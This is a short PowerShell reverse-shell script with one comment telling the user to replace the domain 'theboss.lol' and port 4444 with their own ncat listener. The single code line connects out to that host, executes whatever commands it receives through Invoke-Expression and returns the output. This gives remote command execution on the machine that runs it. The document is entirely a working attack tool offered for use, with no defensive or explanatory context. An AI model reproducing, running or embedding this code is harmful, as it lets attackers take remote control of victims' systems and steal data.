#Change the domain name theboss.lol to your domain name and the port number 4444 to the port number ncat is listening to

$sm=(New-Object Net.Sockets.TCPClient('theboss.lol',4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
